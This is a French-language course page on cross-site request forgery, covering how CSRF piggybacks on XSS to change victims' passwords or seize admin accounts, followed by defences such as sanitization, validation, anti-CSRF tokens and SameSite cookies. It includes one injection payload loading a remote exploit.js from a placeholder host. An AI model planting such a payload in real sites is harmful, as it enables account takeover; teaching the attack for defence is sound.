---
tags:
  - web-applications
ordre: 10
---

# Falsification de requête inter-site (Cross-Site Request Forgery - CSRF)

---

Le troisième type de vulnérabilité front-end causée par des entrées utilisateur non filtrées est la [falsification de requête inter-site (Cross-Site Request Forgery - CSRF)](https://owasp.org/www-community/attacks/csrf). Les attaques `CSRF` peuvent exploiter des vulnérabilités `XSS` pour effectuer certaines requêtes et appels `API` sur une application web à laquelle la victime est actuellement authentifiée. Cela permettrait à l'attaquant d'effectuer des actions en tant qu'utilisateur authentifié. Elles peuvent également exploiter d'autres vulnérabilités pour exécuter les mêmes fonctions, comme l'utilisation de paramètres HTTP pour les attaques.

Une attaque `CSRF` courante pour obtenir un accès avec des privilèges plus élevés à une application web consiste à créer une charge utile (payload) `JavaScript` qui modifie automatiquement le mot de passe de la victime par la valeur définie par l'attaquant. Une fois que la victime visualise la charge utile sur la page vulnérable (par exemple, un commentaire malveillant contenant la charge utile `CSRF` `JavaScript`), le code `JavaScript` s'exécute automatiquement. Il utiliserait la session connectée de la victime pour changer son mot de passe. Une fois cela fait, l'attaquant peut se connecter au compte de la victime et en prendre le contrôle.

Le `CSRF` peut également être exploité pour attaquer les administrateurs et accéder à leurs comptes. Les administrateurs ont généralement accès à des fonctions sensibles, qui peuvent parfois être utilisées pour attaquer et prendre le contrôle du serveur back-end (en fonction des fonctionnalités fournies aux administrateurs au sein d'une application web donnée). En suivant cet exemple, au lieu d'utiliser un code `JavaScript` qui renverrait le cookie de session, nous chargerions un fichier `.js` (`JavaScript`) distant, comme suit :

```html
"><script src=//www.example.com/exploit.js></script>
```

Le fichier `exploit.js` contiendrait le code `JavaScript` malveillant qui modifie le mot de passe de l'utilisateur. Le développement du fichier `exploit.js` dans ce cas nécessite une connaissance de la procédure de changement de mot de passe et des `API` de cette application web. L'attaquant devrait créer un code `JavaScript` qui répliquerait la fonctionnalité souhaitée et l'exécuterait automatiquement (c'est-à-dire un code `JavaScript` qui modifie notre mot de passe pour cette application web spécifique).

---

## Prévention

Bien que des mesures doivent être en place sur le back-end pour détecter et filtrer les entrées utilisateur, il est également toujours important de filtrer et d'assainir les entrées utilisateur sur le front-end avant qu'elles n'atteignent le back-end, et surtout si ce code peut être affiché directement côté client sans communiquer avec le back-end. Deux contrôles principaux doivent être appliqués lors de l'acceptation des entrées utilisateur :

|Type|Description|
|---|---|
|`Assainissement (Sanitization)`|Suppression des caractères spéciaux et des caractères non standard des entrées utilisateur avant de les afficher ou de les stocker.|
|`Validation`|S'assurer que l'entrée utilisateur soumise correspond au format attendu (par exemple, que l'e-mail soumis correspond au format d'une adresse e-mail).|

De plus, il est également important d'assainir les sorties affichées et de supprimer tout caractère spécial/non standard. Si un attaquant parvient à contourner les filtres d'assainissement et de validation du front-end et du back-end, cela ne causera toujours aucun dommage sur le front-end.

Une fois que nous avons assaini et/ou validé les entrées utilisateur et les sorties affichées, nous devrions être en mesure de prévenir les attaques telles que l'injection `HTML` (`HTML Injection`) et le `XSS`. Une autre solution serait de mettre en œuvre un [pare-feu applicatif web (web application firewall - WAF)](https://en.wikipedia.org/wiki/Web_application_firewall), qui peut aider à prévenir automatiquement les tentatives d'injection. Cependant, il convient de noter que les solutions WAF peuvent potentiellement être contournées, les développeurs doivent donc suivre les meilleures pratiques de codage et ne pas se fier uniquement à un appareil pour détecter/bloquer les attaques.

Pour se défendre contre le `XSS`, les navigateurs modernes disposent de protections intégrées qui bloquent l'exécution automatique du code Javascript. Dans le cas du `CSRF`, la plupart des applications web modernes incluent des mécanismes anti-CSRF, tels que l'exigence d'un jeton (token) unique pour chaque session ou requête. De plus, les défenses au niveau HTTP comme l'attribut de cookie `SameSite` (`SameSite=Strict` ou `Lax`) peuvent empêcher les navigateurs d'inclure des cookies d'authentification dans les requêtes inter-origines (cross-origin). Des protections fonctionnelles, comme exiger que l'utilisateur saisisse son mot de passe avant de le modifier, peuvent également aider à atténuer l'impact du CSRF. Malgré ces mesures de sécurité, elles peuvent tout de même être contournées dans certains scénarios. Par conséquent, les vulnérabilités comme le XSS et le CSRF continuent de présenter des risques importants pour les utilisateurs d'applications web. Ces défenses doivent être considérées comme des couches de protection supplémentaires, et non comme des protections principales. Les développeurs doivent s'assurer que leurs applications sont sécurisées dès la conception (secure by design) et non intrinsèquement vulnérables à de telles attaques.

Ce [mémento sur la prévention de la falsification de requête inter-site (Cross-Site Request Forgery Prevention Cheat Sheet)](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) de l'OWASP aborde l'attaque et les mesures de prévention plus en détail.
---

← [[09 - Script inter-sites (Cross-Site Scripting - XSS)]] | [[00 - Sommaire Introduction to Web Applications|Sommaire]] | [[11 - Serveurs Back-End]] →
